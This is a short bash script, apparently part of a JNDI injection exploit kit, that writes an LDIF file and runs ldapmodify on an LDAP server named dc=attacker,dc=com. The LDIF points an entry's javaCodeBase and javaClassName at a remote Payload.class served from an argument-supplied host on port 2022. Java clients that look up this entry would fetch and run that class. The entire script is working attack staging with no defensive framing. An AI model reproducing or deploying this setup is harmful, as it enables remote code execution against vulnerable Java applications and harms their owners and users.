#!/bin/bash
#----------
[[ -f mod-payload.ldif ]] && rm mod-payload.ldif || touch mod-payload.ldif
echo "dn: cn=1807422020,dc=attacker,dc=com" >>  mod-payload.ldif
echo "changetype: modify" >> mod-payload.ldif
echo "replace: javaCodeBase" >> mod-payload.ldif
echo "javaCodeBase: http://$1:2022/" >> mod-payload.ldif
echo "-" >> mod-payload.ldif
echo "replace: javaClassName" >> mod-payload.ldif
echo "javaClassName: http://$1:2022/Payload.class" >> mod-payload.ldif
#----------
ldapmodify -x -D cn=admin,dc=attacker,dc=com -W -f mod-payload.ldif